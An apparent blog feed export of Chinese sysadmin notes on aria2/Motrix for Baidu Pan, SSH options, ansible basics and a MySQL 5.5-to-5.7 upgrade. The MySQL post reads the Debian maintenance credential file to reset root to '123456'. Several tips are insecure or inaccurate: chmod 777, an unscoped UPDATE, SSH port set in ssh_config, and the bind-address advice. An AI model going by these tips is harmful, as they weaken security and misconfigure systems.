        <content type="html"><![CDATA[<h4 id="案发前-被-騷亂時節的少女們-的OP-乙女どもよ-吸引想去追番的我-看着看着突然有两个域名资源加载不出来-然后想着把这两个域名加入到我的pac中-然后发现-我的pac只用链接的-…于是就跑到别人网盘上去下载pac了-就突然想起网页版网盘还能全速跑的骚操作-想安装一波…"><a href="#案发前-被-騷亂時節的少女們-的OP-乙女どもよ-吸引想去追番的我-看着看着突然有两个域名资源加载不出来-然后想着把这两个域名加入到我的pac中-然后发现-我的pac只用链接的-…于是就跑到别人网盘上去下载pac了-就突然想起网页版网盘还能全速跑的骚操作-想安装一波…" class="headerlink" title="案发前: 被　騷亂時節的少女們　的OP 乙女どもよ 吸引想去追番的我, 看着看着突然有两个域名资源加载不出来, 然后想着把这两个域名加入到我的pac中, 然后发现, 我的pac只用链接的,…于是就跑到别人网盘上去下载pac了. 就突然想起网页版网盘还能全速跑的骚操作, 想安装一波…"></a>案发前: 被　騷亂時節的少女們　的OP 乙女どもよ 吸引想去追番的我, 看着看着突然有两个域名资源加载不出来, 然后想着把这两个域名加入到我的pac中, 然后发现, 我的pac只用链接的,…于是就跑到别人网盘上去下载pac了. 就突然想起网页版网盘还能全速跑的骚操作, 想安装一波…</h4><p>然后就完全忘了看番这件事了…..</p><h3 id="Motrix-1-4-1-aria2-1-34-0"><a href="#Motrix-1-4-1-aria2-1-34-0" class="headerlink" title="Motrix(1.4.1) + aria2(1.34.0)"></a>Motrix(1.4.1) + aria2(1.34.0)</h3><p>突然觉得百度云盘直接用web端会方便很多,于是想尝试着去使用 <a href="https://github.com/agalwood/Motrix">Motrix</a> + <a href="https://github.com/aria2/aria2">aria2</a> + <a href="https://github.com/acgotaku/BaiduExporter">BaiduExporter</a> 的组合, 然后就掉坑了….</p><h3 id="Motrix-官网下载就好啦"><a href="#Motrix-官网下载就好啦" class="headerlink" title="Motrix 官网下载就好啦!"></a>Motrix 官网下载就好啦!</h3><h3 id="编译安装最新版本滴-aria2"><a href="#编译安装最新版本滴-aria2" class="headerlink" title="编译安装最新版本滴 aria2"></a>编译安装最新版本滴 <a href="https://github.com/aria2/aria2/releases">aria2</a></h3><p>解压进入目录编译安装一条龙…(<strong>记得切换位root用户,不然安装时有可能提示权限不够</strong>)<br>预编译也不需要加其他拓展,默认就OK啦!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">tar &amp;&amp; <span class="built_in">cd</span>  &amp;&amp; ./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>继续保持root用户, 方便操作<br>配置文件目录任意, 但要保持下面的path都在同一path .session 文件一定要有喔!<br>aria2.conf 的配置可以参考下<a href="https://github.com/TARI0510/Ubuntu/blob/master/arias.conf">我滴</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /path/aria2 &amp;&amp; touch /path/aria2.session &amp;&amp; chmod 777 /path/aria2.session</span><br><span class="line">vim /path/aria2.conf</span><br></pre></td></tr></table></figure><h3 id="配置完成就可以使用啦-才怪"><a href="#配置完成就可以使用啦-才怪" class="headerlink" title="配置完成就可以使用啦!(才怪)"></a>配置完成就可以使用啦!(才怪)</h3><p>要么你是root用户, 不然启动 aria2c 一定记得加 <strong>sudo</strong>!! 我就被坑了…emmm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo aria2c --conf-path=/path/aria2/aria2.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个是在后台运行, 还没下载成功之前建议用上面的, 方便查看运行结果</span></span><br><span class="line">sudo aria2c --conf-path=/path/aria2/aria2.conf -D</span><br></pre></td></tr></table></figure><h3 id="安装-BaiduExporter-我使用的是0-8-5"><a href="#安装-BaiduExporter-我使用的是0-8-5" class="headerlink" title="安装 BaiduExporter(我使用的是0.8.5)"></a>安装 <a href="https://github.com/acgotaku/BaiduExporter">BaiduExporter</a>(我使用的是0.8.5)</h3><p>记得安装最新版本, 我就因为没安装最新版本, 他原本对 pan.baidu.com 之类的域名是没有授权, 导致aria2访问不到, 哭死…仔细看README.MD的重要性….</p><p>随便找个可以下载百度云的链接打开, 看到 <strong>MO.app</strong> 在 保存到网盘 下载等按钮附件就知道插件安装成功啦!!(记得在chrome拓展看看有没有报错, 报错要重装喔!)</p><p>说说 MO.app 里面 <strong>设置</strong> 里面主要字段的含义吧!</p><h4 id="RPC地址"><a href="#RPC地址" class="headerlink" title="RPC地址"></a>RPC地址</h4><p>使用MO下载: 就是下载按钮的名字啦!<br>后面跟着的内容在README.ME有说, 我的是<a href="http://token/">http://token</a>:(在motrix Preference-&gt;Advanced-&gt;Security-&gt;RPCSecret 里面的内容)@localhost:16800/jsonrpc </p><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><p>在 Motrix Preference-&gt;Advanced-&gt;Security: Mock User-Agent 选择 <strong>du</strong></p><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>保持默认的 <a href="https://pan.baidu.com/disk/home">https://pan.baidu.com/disk/home</a> 就好啦!</p><h4 id="Motrix-的配置更改后记得点-Save-amp-Apply-就好啦"><a href="#Motrix-的配置更改后记得点-Save-amp-Apply-就好啦" class="headerlink" title="Motrix 的配置更改后记得点 Save &amp; Apply 就好啦!"></a>Motrix 的配置更改后记得点 Save &amp; Apply 就好啦!</h4><h3 id="我踩滴坑"><a href="#我踩滴坑" class="headerlink" title="我踩滴坑"></a>我踩滴坑</h3><h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">07/07 22:22:06 [ERROR] Failed to serialize session to <span class="string">&#x27;/etc/aria2/aria2.session&#x27;</span>.</span><br></pre></td></tr></table></figure><p>这个主要是因为我没有用 sudo 运行 aria2c</p><h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">07/07 23:46:37 [ERROR] CUID<span class="comment">#10 - Download aborted. URI=https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E6%88%91%E7%9A%84%E8%B5%84%E6%BA%90%2F%E5%9B%9E%E9%A1%BE%E8%A7%86%E9%A2%91.mp4</span></span><br><span class="line">Exception: [AbstractCommand.cc:351] errorCode=22 URI=https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2F%E6%88%91%E7%9A%84%E8%B5%84%E6%BA%90%2F%E5%9B%9E%E9%A1%BE%E8%A7%86%E9%A2%91.mp4</span><br><span class="line">  -&gt; [HttpSkipResponseCommand.cc:240] errorCode=22 </span><br><span class="line">  The response status is not successful. status=403</span><br><span class="line"></span><br><span class="line">07/07 23:46:37 [NOTICE] Download GID<span class="comment">#2384700d4e908591 not complete: /home/tari/Downloads/回顾视频.mp4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个主要是因为我插件关于百度云盘的域名授权问题, 保持好插件最新版本就好啦!</p>]]></content>
      
      
      <categories>
          
          <category> 日常折腾 </category>
          
          <category> Motrix </category>
          
          <category> aria2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常折腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>about ssh</title>
      <link href="//p/2019/ssh/"/>
      <url>//p/2019/ssh/</url>
      
        <content type="html"><![CDATA[<h3 id="etc-hosts-deny-禁用无效"><a href="#etc-hosts-deny-禁用无效" class="headerlink" title="/etc/hosts.deny 禁用无效"></a>/etc/hosts.deny 禁用无效</h3><p>原因：编译安装时默认没有加载libwrap库</p><p>[转载自 <a href="https://mp.weixin.qq.com/s?__biz=MzU3NTgyODQ1Nw==&mid=2247485564&idx=2&sn=38620597bda9f3dfdd7208c4f94d7ff2&chksm=fd1c70faca6bf9ec7fab69f1fdd5453f63bd7040940b33b1a730c1d12a42675424b70f906e69&mpshare=1&scene=1&srcid=&key=87f46a9190202d8fe4b26708a8287afdd783bcdb437852de4172f55513c3c4bbd3a4364ee67068e983d84c07bb884d0298b24e15cb905ce6fa82db7ec104b33886b6e02e2e359a596cdec79929c1174e&ascene=1&uin=MjMxMTMxNDIxMw==&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=Ks6ARNaAyjOn+MDn0BlfGaZi3QgnAKBugECR9dT+pk7bVXvF/R+0jnIDyFwuIf9P">良许Linux</a>]</p><h4 id="Secure-Shell缩写是SSH，-由IETF的网络工作小组（Network-Working-Group）所制定，SSH是一项创建在应用层和传输层基础上的安全协议，为计算机的shell提供安全的传输和使用环境。"><a href="#Secure-Shell缩写是SSH，-由IETF的网络工作小组（Network-Working-Group）所制定，SSH是一项创建在应用层和传输层基础上的安全协议，为计算机的shell提供安全的传输和使用环境。" class="headerlink" title="Secure Shell缩写是SSH， 由IETF的网络工作小组（Network Working Group）所制定，SSH是一项创建在应用层和传输层基础上的安全协议，为计算机的shell提供安全的传输和使用环境。"></a>Secure Shell缩写是SSH， 由IETF的网络工作小组（Network Working Group）所制定，SSH是一项创建在应用层和传输层基础上的安全协议，为计算机的shell提供安全的传输和使用环境。</h4><p>下面我们来介绍 SSH 的 7 大用法。</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>最简单的用法就是不带参数，仅输入 ssh 再加上主机地址，比如：</p><p>ssh 192.168.0.116<br>这种形式登陆主机，会默认使用当前用户进行登录。第一次连接的时候，SSH 会确认目标主机的真实性，如果没有问题的话，输入 yes 即可。</p><p>如果我们想要以指定用户名来登录主机，有两种方法：</p><p>a. 使用 -l 选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -l alvin 192.168.0.116</span><br></pre></td></tr></table></figure><p>b. 使用 user@hostname 格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh alvin@192.168.0.116</span><br></pre></td></tr></table></figure><p>这两种方法，其中第二种尤为常用。</p><h3 id="指定端口登录"><a href="#指定端口登录" class="headerlink" title="指定端口登录"></a>指定端口登录</h3><p>SSH 默认使用的端口号是 22。大多现代的 Linux 系统 22 端口都是开放的。如果你运行 ssh 程序而没有指定端口号，它直接就是通过 22 端口发送请求的。</p><p>如果我们不想通过 22 端口登录，那么我们可以使用 -p 选项来指定端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 192.168.0.116 -p 1234</span><br></pre></td></tr></table></figure><p>引申话题：如何修改端口号？<br>只需修改 /etc/ssh/ssh_config ，修改如下一行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 22</span><br></pre></td></tr></table></figure><h3 id="对所有数据请求压缩"><a href="#对所有数据请求压缩" class="headerlink" title="对所有数据请求压缩"></a>对所有数据请求压缩</h3><p>使用 -C 选项，所有通过 SSH 发送或接收的数据将会被压缩，并且任然是加密的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -C 192.168.0.116</span><br></pre></td></tr></table></figure><p>但是，这个选项在网速不是很快的时候比较有用，而当网速较快的时候，使用压缩反而会降低效率，所以要视情况使用。</p><h3 id="打开调试模式"><a href="#打开调试模式" class="headerlink" title="打开调试模式"></a>打开调试模式</h3><p>因为某些原因，我们想要追踪调试我们建立的 SSH 连接情况。SSH 提供的 -v 选项参数正是为此而设的。其可以看到在哪个环节出了问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Alvin.Alvin-computer] ➤ ssh -v pi@192.168.0.116</span><br><span class="line">OpenSSH_7.1p2, OpenSSL 1.0.1g 7 Apr 2014</span><br><span class="line">debug1: Reading configuration data /etc/ssh_config</span><br><span class="line">debug1: Connecting to 192.168.0.116 [192.168.0.116] port 22.</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: key_load_public: No such file or directory</span><br><span class="line">debug1: Enabling compatibility mode <span class="keyword">for</span> protocol 2.0</span><br><span class="line">debug1: Local version string SSH-2.0-OpenSSH_7.1</span><br><span class="line">debug1: Remote protocol version 2.0, remote software version OpenSSH_7.4p1 Raspbian-10+deb9u4</span><br><span class="line">debug1: match: OpenSSH_7.4p1 Raspbian-10+deb9u4 pat OpenSSH* compat 0x04000000</span><br><span class="line">debug1: Authenticating to 192.168.0.116:22 as <span class="string">&#x27;pi&#x27;</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br></pre></td></tr></table></figure><h3 id="绑定源地址"><a href="#绑定源地址" class="headerlink" title="绑定源地址"></a>绑定源地址</h3><p>如果你的客户端有多于两个以上的 IP 地址，你就不可能分得清楚在使用哪一个 IP 连接到 SSH 服务器。为了解决这种情况，我们可以使用 -b 选项来指定一个IP 地址。这个 IP 将会被使用做建立连接的源地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Alvin.Alvin-computer] ➤ ssh -b 192.168.0.105 pi@192.168.0.116</span><br><span class="line">Linux raspberrypi 4.14.71-v7+ <span class="comment">#1145 SMP Fri Sep 21 15:38:35 BST 2018 armv7l</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Feb 24 08:52:29 2019 from 192.168.0.105</span><br></pre></td></tr></table></figure><h3 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h3><p>如果我们想在目标主机执行一条命令，我们通常的做法是，先登录到目标主机，执行命令，再退出来。这样做当然是可以，但是比较麻烦。</p><p>如果我们仅仅是想远程执行一条命令，可以直接在后面跟上命令就好，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Alvin.Alvin-computer] ➤ ssh pi@192.168.0.116 ls -l</span><br><span class="line">Desktop</span><br><span class="line">Documents</span><br><span class="line">Downloads</span><br><span class="line">MagPi</span><br><span class="line">Music</span><br></pre></td></tr></table></figure><h3 id="挂载远程文件系统"><a href="#挂载远程文件系统" class="headerlink" title="挂载远程文件系统"></a>挂载远程文件系统</h3><p>另外一个很赞的基于 SSH 的工具叫 sshfs。 sshfs 可以让你在本地直接挂载远程主机的文件系统。它的使用格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshfs -o idmap=user user@hostname:/home/user ~/Remote</span><br></pre></td></tr></table></figure><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshfs -o idmap=user pi@192.168.0.116:/home/pi ~/Pi</span><br></pre></td></tr></table></figure><p>这个命令可以将远程主机 pi 用户的主目录挂载到本地主目录下的 Pi 文件夹。</p><h4 id="类似文章"><a href="#类似文章" class="headerlink" title="类似文章"></a>类似文章</h4><p><a href="https://mp.weixin.qq.com/s?__biz=MzU3NTgyODQ1Nw==&mid=2247485113&idx=1&sn=abea3f5747ab3de98304af6cb3cbc284&chksm=fd1c7e3fca6bf729240929b5e601689224cfa45af3d85687d526a933b9230c49ac4e71219fee&mpshare=1&scene=1&srcid=&key=b2c45c44f63c475036caf81458c44270265fe62073129d3613733350f1782404341d5c22f720910d41ea6434cd634cf4ace07220484616551b1cbda27b5a4c50fe20f488447cfec1c7922f7ad81b7fa4&ascene=1&uin=MjMxMTMxNDIxMw==&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=Ks6ARNaAyjOn+MDn0BlfGaZi3QgnAKBugECR9dT+pk7bVXvF/R+0jnIDyFwuIf9P">良许Linux 排除Linux机器是否被入侵</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> SSH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识 ansible (一)</title>
      <link href="//p/2019/%E5%88%9D%E8%AF%86-ansible-1/"/>
      <url>//p/2019/%E5%88%9D%E8%AF%86-ansible-1/</url>
      
        <content type="html"><![CDATA[<h3 id="个人踩滴小坑"><a href="#个人踩滴小坑" class="headerlink" title="个人踩滴小坑"></a>个人踩滴小坑</h3><p>要注意下下, 一些参数的含义是什么, 好比我调用 script 模块, 想把脚本调用到目标服务器去执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- name: backup base system version</span><br><span class="line">    script: /baseVersionBackup.sh 传入脚本参数1, 2, 3....</span><br></pre></td></tr></table></figure><p>“机智” 的我以为这是到对方服务器的根目录执行脚本….emmmmmm<br>** 注意 chdir 是脚本在对方服务器执行的目录, baseVersionBackup.sh 是你本机脚本的位置 **</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正确操作</span></span><br><span class="line">- name: backup base system version</span><br><span class="line">    script: <span class="built_in">chdir</span>=/ baseVersionBackup.sh 传入脚本参数1, 2, 3....</span><br></pre></td></tr></table></figure><h3 id="ansible-基于key的验证是一基本要求"><a href="#ansible-基于key的验证是一基本要求" class="headerlink" title="ansible: 基于key的验证是一基本要求"></a>ansible: 基于key的验证是一基本要求</h3><h3 id="特性"><a href="#特性" class="headerlink" title="特性:"></a>特性:</h3><ul><li>模块化</li><li>有Paramiko, PyYAML, Jinja2(模块语言)三个关键模块</li><li>支持自定义模块</li><li>基于python实现</li><li>部署简单，基于python和ssh(默认已安装), agentless</li><li>安全, 基于OpenSSH</li><li>支持playbook编排任务</li><li>幂等性: 一个任务执行一遍和执行n遍, 不因重复执行带来意外情况</li><li>无需代理不依赖PKI(无需ssl)</li><li>可使用任何变成语言写模块</li><li>YAML格式，编排任务，支持丰富的数据结构</li><li>较强大的多层解决方案</li></ul><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><ul><li><p>/etc/ansible/ansible.cfg 主配置文件，配置ansible工作特性(一般保持默认)<br>  为什么我执行的ansible指令对方就能执行？(tmp执行完会删除)</p><ul><li>脚本的临时目录:<br>remote_tmp  = ~/.ansible/tmp<br>local_tmp   = ~/.ansible/tmp</li></ul><ul><li>forks 并发执行</li><li>poll_interval 多长时间去拉一次数据</li><li>sudo_user 默认用户</li><li>ask_sudo_pass 是否询问口令</li><li>ask_pass    是否支持口令</li><li>host_key_checking 是否检查对应服务器的host_key, 建议取消注释</li><li>log_path    日志建议打开</li></ul></li><li><p>/etc/ansible/hosts 主机清单<br>  分组:<br>  [webserver]<br>  # 写域名需要借助dns去解析<br>  10.10.0.1[18:20]<br>  10.10.0.92:8080<br>  www[01:100].example.com<br>  db-[a:f].example.com</p></li><li><p>ssh基于key验证:<br>  ssh-keygen 输入完后加一下秘钥<br>  ssh-copy-id ip地址</p></li><li><p>Host-pattern:<br>  ALL、通配符*<br>  或关系，如: ansible “group1:group2” 或者 ansible “ip1:ip2”<br>  与关系，如: ansible “group1:&amp;group2” 两个组都在的主机<br>  非关系，如: ansible “group1:!group2” 在组1不在组2<br>  综合关系,如: ansible “group1:group2:&amp;group3:!group4”<br>  正则表达式 “~(web|file).*\.fosu\.com”<br>  /etc/ansible/roles/ 存放角色的目录</p></li></ul><h3 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h3><ul><li>/usr/bin/ansible 主程序，临时命令执行工具<br>  –version<br>  -m 模块 默认command 例如ping<br>  -a 模块参数<br>  -v -vv -vvv<br>  –list-hosts 显示主机列表<br>  -k 提示输入ssh连接密码，默认Key验证<br>  -K 提示输入sudo时的口令<br>  -C 检查，并不执行<br>  -T TIMEOUT 默认10s<br>  -u 执行远程执行的用户<br>  -b sudo</li><li>/usr/bin/ansible-doc 查看配置文档，模块功能查看工具<br>  -a 可以列出当前模块列表，很多…<br>  -l 比较常用 ansible-doc -l ping<br>  -s 片段解释<br>  执行过程:<pre><code>  1.加载自己的配置文件 默认/etc/ansible/ansible.cfg  2.加载自己对应的模块文件,如command  3.通过ansible将模块或命令生成对应的临时py文件并将该文件传输至远程服务器的对应执行用户      $HOME/.ansible/tmp/ansible-tmp-数组/xxx.py文件  4.给文件+x执行  5.执行并返回结果  6.删除临时py文件, sleep 0退出</code></pre>  执行状态:<pre><code>  绿色:执行成功并且不需要做改变的操作  黄色:执行成功并且对目标主机做变更  红色:执行失败</code></pre></li><li>/usr/bin/ansible-galaxy 下载/上传优秀代码或Roles模块的官网平台</li><li>/usr/bin/ansible-playbook 定制自动化任务，编排剧本工具/usr/bin/ansible-pull远程执行命令工具</li><li>/usr/bin/ansible-valut 文件加密工具</li><li>/usr/bin/ansible-console 基于Console界面与用户交互的执行工具</li></ul><h3 id="自动化运维应用场景"><a href="#自动化运维应用场景" class="headerlink" title="自动化运维应用场景"></a>自动化运维应用场景</h3><ul><li>文件传输</li><li>命令执行<br>  应用部署<br>  配置管理<br>  任务流编排</li><li>工具：<br>  Ansible 适合中小型企业<br>  Puppet 适合大型公司，例如谷歌</li></ul><h3 id="相关概念："><a href="#相关概念：" class="headerlink" title="相关概念："></a>相关概念：</h3><p>代码发布机(堡垒机)通常存在发布环境中：负责把在开发完成经测试没问题后发布到生产环境中<br>通常需要2台(主备)</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL upgrade, from 5.5.* to 5.7.*</title>
      <link href="//p/2019/MySQL_upgrade_from_5.5.*_to_5.7.*/"/>
      <url>//p/2019/MySQL_upgrade_from_5.5.*_to_5.7.*/</url>
      
        <content type="html"><![CDATA[<h3 id="服务器版本-Ubuntu14-04"><a href="#服务器版本-Ubuntu14-04" class="headerlink" title="服务器版本 Ubuntu14.04"></a>服务器版本 Ubuntu14.04</h3><h3 id="备份-快照"><a href="#备份-快照" class="headerlink" title="备份(快照)"></a>备份(快照)</h3><h3 id="日常忘记密码-知道密码滴请直接跳至-开始升级至5-7"><a href="#日常忘记密码-知道密码滴请直接跳至-开始升级至5-7" class="headerlink" title="日常忘记密码 -,- (知道密码滴请直接跳至 开始升级至5.7.* )"></a>日常忘记密码 -,- (知道密码滴请直接跳至 开始升级至5.7.* )</h3><p>介绍一个简单修改数据库密码的方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /etc/mysql/debian.cnf </span><br></pre></td></tr></table></figure><p>红线选中部分为我本地mysql的用户和密码(<strong>password部分每个人不同的喔!</strong>)<br><img src="/img/Linux_Server_Maintenance/mysqlForgetPass1.png" class="lazyload" data-srcset="/img/Linux_Server_Maintenance/mysqlForgetPass1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="pass"><br>存在mysql的debian-sys-maint用户和密码,那他们是怎么来的呢?</p><p>先假科普一波, 正如它的字面意思（Debian System Matainence），Debian系统对MySQL维护用的，你可以理解为通过系统的某个 “非常规” 程序对Mysql进行备份恢复等行为时，该程序所使用的登录Mysql的账户。</p><p>使用以上账号密码登录至mysql执行下面三条命令就可以把密码更改为 123456啦!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line"></span><br><span class="line">update user <span class="built_in">set</span> authentication_string=password(<span class="string">&#x27;123456&#x27;</span>) <span class="built_in">where</span> user=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"></span><br><span class="line">update user <span class="built_in">set</span> plugin=<span class="string">&#x27;mysql_native_password&#x27;</span>;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>登录验证下即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><h3 id="开始升级至5-7"><a href="#开始升级至5-7" class="headerlink" title="开始升级至5.7.*"></a>开始升级至5.7.*</h3><p>默认情况下，apt是无法直接升级到mysql5.7的，因此需要额外设置</p><p>首先，备份数据，尽管下面的方式不会丢失你的数据，但是为了安全考虑，建议备份。</p><ul><li>下载mysql-apt的配置包，并安装</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://dev.mysql.com/get/mysql-apt-config_0.8.1-1_all.deb</span><br><span class="line"></span><br><span class="line">sudo dpkg -i mysql-apt-config_0.8.1-1_all.deb</span><br></pre></td></tr></table></figure><p>在安装的过程中，会要求选择mysql版本，选择mysql5.7版本后，点击“OK”。</p><ul><li>更新源并安装数据库，在安装过程中，会自动卸载已经安装的老版本数据。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install mysql-server</span><br></pre></td></tr></table></figure><ul><li>安装 mysql 后，使用mysql_upgrade升级数据库文件版本(必须是root用户喔!)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql_upgrade -uroot -p</span><br></pre></td></tr></table></figure><ul><li>重启mysql,并检查数据是否正常</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysql restart</span><br><span class="line"></span><br><span class="line">mysqlcheck -uroot -p --all-databases</span><br></pre></td></tr></table></figure><ul><li>如果一切正常，所有表的检查结果均是ok状态。</li></ul><p>同时，也可以进入mysql使用select version()； 来查看mysql-server 版本号。</p><h3 id="更新过程中遇到的问题："><a href="#更新过程中遇到的问题：" class="headerlink" title="更新过程中遇到的问题："></a>更新过程中遇到的问题：</h3><ul><li>在ubuntu 14的版本中，安装了mysql 后，启动时，程序提示 “No directory, logging in with HOME=/”。 具体如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@xxx:/etc/mysql<span class="comment"># service mysql restart</span></span><br><span class="line"> \* Stopping MySQL Community Server 5.7.11</span><br><span class="line">...</span><br><span class="line"> \* MySQL Community Server 5.7.11 is stopped</span><br><span class="line"> \* Re-starting MySQL Community Server 5.7.11</span><br><span class="line">No directory, logging <span class="keyword">in</span> with HOME=/</span><br><span class="line">..</span><br><span class="line"> \* MySQL Community Server 5.7.11 is started</span><br></pre></td></tr></table></figure><p>解决办法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service MySQL stop</span><br><span class="line">sudo usermod -d /var/lib/mysql/ mysql</span><br><span class="line">sudo service mysql start</span><br></pre></td></tr></table></figure><ul><li>更新mysql版本后，所有的配置文件都会被删除，因此需要修改mysql配置<br>说人话就是，远程是访问不到本数据库的</li></ul><p>把 /etc/mysql/mysql.conf.d/mysql.cnf 配置文件中<br>#bind-address =127.0.0.1 的注释符号去掉即可</p>]]></content>
      
      
      <categories>
          
